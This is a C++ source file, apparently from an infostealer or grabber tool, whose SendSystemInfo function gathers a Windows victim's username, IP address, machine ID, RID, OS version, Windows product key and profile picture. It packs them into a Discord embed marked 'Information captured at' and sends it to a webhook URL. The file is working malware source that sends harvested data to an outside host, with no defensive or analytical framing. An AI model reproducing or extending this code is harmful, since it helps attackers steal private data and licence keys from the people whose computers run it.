#include "SendHardware.hpp"
#include "Hardware.hpp"
#include "../Extension/Payload/Payload.hpp"
#include <random>
#include <ctime>
#include <fstream>

int SendHardware::GetRandomColor() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 0xFFFFFF);
    return dis(gen);
}

bool SendHardware::SendSystemInfo(const std::string& webhook_url) {
    // Get system information
    std::string username = Hardware::GetUsername();
    std::string ipAddress = Hardware::GetIPAddress();
    std::string machineID = Hardware::GetMachineID();
    std::string rid = Hardware::GetRelativeIdentifier();
    std::string windowsVersion = Hardware::GetWindowsVersion();
    std::string windowsKey = Hardware::GetWindowsKey();
    std::string profilePicPath = Hardware::GetUserProfilePicture();

    // Get current time
    time_t now = time(0);
    char timestamp[100];
    struct tm timeinfo;
    localtime_s(&timeinfo, &now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &timeinfo);

    // Create Discord Embed
    Payload::Embed systemInfo;

    // Set title with Windows version
    systemInfo.title = "🖥️ System Information";

    // Set description with formatted system info
    systemInfo.description = "```ini\n"
        "[User Information]\n"
        "Username    : " + username + "\n"
        "RID        : " + rid + "\n\n"
        "[System Information]\n"
        "OS         : " + windowsVersion + "\n"
        "Product Key: " + windowsKey + "\n\n"
        "[Network Information]\n"
        "IP Address : " + ipAddress + "\n"
        "Machine ID : " + machineID + "\n"
        "```";

    // Add footer with timestamp
    systemInfo.footer.text = "Information captured at: " + std::string(timestamp);
    systemInfo.footer.icon_url = "https://i.imgur.com/AfFp7pu.png";  // Windows logo

    // Set random color for embed (Shade of blue for Windows theme)
    systemInfo.color = 0x00A4EF;  // Windows blue

    // Add user's profile picture if available
    if (!profilePicPath.empty()) {
        systemInfo.thumbnail_url = profilePicPath;
    }

    // Send to Discord
    return Payload::SendEmbed(webhook_url, systemInfo);
}